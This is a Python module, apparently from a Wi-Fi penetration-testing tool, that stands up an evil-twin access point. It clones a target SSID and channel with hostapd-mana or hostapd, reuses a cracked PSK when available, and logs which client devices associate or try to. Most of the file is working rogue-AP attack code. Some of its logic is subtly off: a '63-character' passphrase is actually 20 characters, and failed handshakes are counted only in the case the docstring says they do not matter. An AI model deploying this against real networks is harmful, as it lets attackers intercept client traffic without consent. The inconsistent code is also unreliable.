# SPDX-License-Identifier: Apache-2.0 OR BSD-3-Clause
"""Evil twin: the network the clients already trust, served by us.

A twin works because a station prefers the network it remembers over the one it can
hear: it will associate with whichever BSSID answers first, which is why the attack
needs no deauthentication at all.  What comes out of it depends on what the operator
knows before it starts, and the two cases are reported differently:

* **the PSK is known** (it was cracked earlier in the engagement) — the twin is a
  *working* access point for the target SSID: clients associate, traffic can be
  captured, and the finding is that the network can be replaced, not merely imitated.
* **the PSK is unknown** — clients still try, the 4-way handshake fails when they
  cannot derive the same keys, and what is learned is who prefers this SSID, from
  which BSSID, and how many.  That is a real finding (it is the shortlist for a
  targeted attack), and it is *not* a password: this module never claims one.

The twin is started with ``hostapd-mana`` when available (it also answers the probes
clients send for networks that are not on air) and plain ``hostapd`` otherwise, and it
is stopped in a ``finally`` block.  It transmits, so it is gated by the authorisation
prompt, and its default is off.
"""

from __future__ import annotations

import contextlib
import os
import random
import re
import time
from typing import List

from ..deps import registry
from ..models import STATUS_SUCCESS, AccessPoint, Attempt, Finding
from ..util import Process, human_duration
from .base import Attack, AttackContext, AttackOutcome

#: hostapd-family output that means a station joined (or tried to)
JOINED_RE = re.compile(r"(AP-STA-CONNECTED|associated|STA .* associated)", re.I)
FAILED_RE = re.compile(r"(4-way handshake failed|WPA: sending 1/4 msg .* but not "
                       r"authenticated|deauthenticated|handshake failed)", re.I)
STA_MAC_RE = re.compile(r"([0-9a-f]{2}(?::[0-9a-f]{2}){5})", re.I)


class EvilTwinAttack(Attack):
    name = "evil_twin"
    label = "Evil twin (client lure)"
    tool = "hostapd-mana / hostapd"
    description = ("Serve the target's SSID from your own radio and see which clients "
                   "prefer it to the real thing — no deauth, no association with the "
                   "AP.  With the PSK already known the twin is a working access "
                   "point; without it, the finding is the list of clients that tried.")
    requires = ("monitor",)
    needs_injection = True                  # it is an access point: it transmits
    applies_to = ("WPA", "WPA2", "WPA2/WPA3", "WPA3", "OPEN", "WEP")

    def applies(self, ap: AccessPoint) -> bool:
        # a hidden network has no name to imitate; an enterprise one needs the rogue
        # RADIUS attack instead (a PSK twin cannot answer 802.1X)
        if not (ap.essid or "").strip():
            return False
        return ap.auth.upper() not in ("MGT", "802.1X", "ENTERPRISE")

    def available(self, ctx: AttackContext) -> bool:
        if ctx.demo:
            return True
        return bool(registry.path("hostapd-mana") or registry.path("hostapd"))

    def unavailable_reason(self, ctx: AttackContext) -> str:
        return "needs hostapd-mana or hostapd (and a second radio for the twin)"

    # ---------------------------------------------------------------- #
    def _psk_for_twin(self, ap: AccessPoint) -> str:
        """The PSK the twin will use: the cracked one, or a throwaway."""
        if ap.cracked and (ap.password or ""):
            return ap.password
        # a random 63-character passphrase is *not* the target's: clients will try,
        # fail the 4-way handshake, and that is exactly what gets measured
        return "".join(random.choice("abcdefghjkmnpqrstuvwxyz23456789")
                       for _ in range(20))

    def _config(self, ap: AccessPoint, directory: str, psk: str) -> str:
        """A minimal hostapd config: the target's SSID, on our chosen interface."""
        path = os.path.join(directory, "twin.conf")
        channel = ap.channel or 1
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(
                "# wifipilot evil twin: one authorised lure, stopped automatically\n"
                f"interface={getattr(self, '_iface', 'mon0')}\n"
                "driver=nl80211\n"
                f"ssid={(ap.essid or 'wifi')[:32]}\n"
                f"channel={channel}\n"
                f"hw_mode={'a' if channel > 14 else 'g'}\n"
                "auth_algs=1\n"
                "wpa=2\n"
                "wpa_key_mgmt=WPA-PSK\n"
                "rsn_pairwise=CCMP\n"
                f"wpa_passphrase={psk}\n"
                "ignore_broadcast_ssid=0\n")
        return path

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(
            self.name, ap.bssid, tool=self.tool,
            chosen_by=getattr(ap, "picked_by", "heuristic"),
            reason=getattr(ap, "pick_reason", ""),
        )
        if not self.applies(ap):
            result = "a twin needs a named, PSK network"
            ctx.session.end_attempt(attempt, "skipped", result)
            return AttackOutcome.skipped(result, f"{ap.display_name} is "
                                                 f"{ap.auth or 'enterprise'}")
        known_psk = bool(ap.cracked and ap.password)
        psk = self._psk_for_twin(ap)
        ctx.bus.log(f"evil twin for {ap.display_name} on ch {ap.channel}: "
                    + ("PSK known — clients that join get a working network"
                       if known_psk else
                       "PSK unknown — join attempts are still what we measure"),
                    level="warning")
        if ctx.demo:
            return self._demo(ctx, ap, attempt, psk, known_psk)
        return self._live(ctx, ap, attempt, psk, known_psk)

    # ---------------------------------------------------------------- #
    def _finish(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                stations: List[str], psk_known: bool, seconds: float,
                simulated: bool) -> AttackOutcome:
        count = len(stations)
        if not count:
            return self._fail(
                ctx, attempt, "no client came to the twin",
                f"{human_duration(seconds)} of beaconing {ap.essid!r}: no station "
                f"associated or tried to.  A twin is only as good as the clients in "
                f"range — try again while a client is active, or use `tracker` first "
                f"to see who is around")
        if psk_known:
            detail = (f"{count} station(s) joined the twin of {ap.essid!r}"
                      f" ({', '.join(stations[:4])}) and completed the 4-way "
                      f"handshake: the network can be replaced, not just imitated")
            severity, title = "high", "Clients joined a twin of this network"
        else:
            detail = (f"{count} station(s) tried to join the twin of {ap.essid!r} "
                      f"({', '.join(stations[:4])}); the handshake failed because the "
                      f"twin's PSK is not the real one, which is the measurement — "
                      f"these are the clients that prefer this SSID to the real AP")
            severity, title = "medium", "Clients prefer this SSID (twin lured them)"
        if simulated:
            detail += " (simulated)"
        ctx.session.add_finding(Finding(kind="evil_twin", severity=severity,
                                        bssid=ap.bssid, title=title, detail=detail))
        ap.remember("evil_twin", detail, stations=stations[:10], psk_known=psk_known)
        ctx.session.stats.twins_run += 1
        ctx.session.end_attempt(attempt, STATUS_SUCCESS, title, detail)
        return AttackOutcome.success(
            title, detail=detail,
            extra={"stations": stations[:20], "station_count": count,
                   "psk_known": psk_known, "simulated": simulated,
                   "ssid": ap.essid,
                   "note": ("the twin is stopped before this attack returns; with the "
                            "PSK known it is a working access point, without it the "
                            "measurement is who preferred it")})

    def _demo(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
              psk: str, known_psk: bool) -> AttackOutcome:
        radio = ctx.radio
        demo_ap = radio.find(ap.bssid) if radio else None
        stations: List[str] = []
        started = time.time()
        for step in range(1, 5):
            ctx.progress(f"evil twin of {ap.essid or ap.bssid}", kind="capture",
                         bssid=ap.bssid, percent=step * 22,
                         detail=f"{len(stations)} client(s) — {'PSK known' if known_psk else 'PSK unknown'}")
            time.sleep(0.4)
            if ctx.want_stop():
                break
            # the demo clients that belong to this AP are the ones that wander over
            if demo_ap is not None and step >= 2 and step - 2 < len(demo_ap.clients):
                mac = demo_ap.clients[step - 2].mac
                if mac not in stations:
                    stations.append(mac)
        return self._finish(ctx, ap, attempt, stations, known_psk,
                            time.time() - started, True)

    def _live(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
              psk: str, known_psk: bool) -> AttackOutcome:
        binary = registry.path("hostapd-mana") or registry.path("hostapd")
        if not binary:
            return self._fail(ctx, attempt, "no hostapd-family binary",
                              "install hostapd-mana or hostapd")
        iface = getattr(ctx.config, "twin_interface", "") or ctx.monitor
        self._iface = iface
        directory = os.path.dirname(ctx.artifact_path("twin", ap, "")) or "."
        config = self._config(ap, directory, psk)
        timeout = min(ctx.config.attack_timeout_for(self.name), 600.0)
        args = [binary, config]
        proc = Process(args, name=os.path.basename(binary),
                       echo_lines=ctx.config.verbose_tools)
        proc.start()
        if proc.error:
            return self._fail(ctx, attempt, f"could not start {os.path.basename(binary)}",
                              proc.error)
        stations: List[str] = []
        started = time.time()
        try:
            while not ctx.want_stop() and time.time() - started < timeout:
                time.sleep(1.0)
                ctx.progress(f"evil twin of {ap.essid or ap.bssid}", kind="capture",
                             bssid=ap.bssid,
                             percent=min(95, (time.time() - started) / timeout * 100),
                             detail=f"{len(stations)} station(s) seen")
                for line in proc.lines[-100:]:
                    if JOINED_RE.search(line) or (known_psk and FAILED_RE.search(line)):
                        for mac in STA_MAC_RE.findall(line):
                            if mac.lower() not in stations:
                                stations.append(mac.lower())
                if stations and not known_psk:
                    # the measurement is done: we know who prefers this SSID
                    break
        finally:
            with contextlib.suppress(Exception):
                proc.stop()
            with contextlib.suppress(Exception):
                if proc.running:
                    proc.stop(grace=2.0)
        return self._finish(ctx, ap, attempt, stations, known_psk,
                            time.time() - started, False)
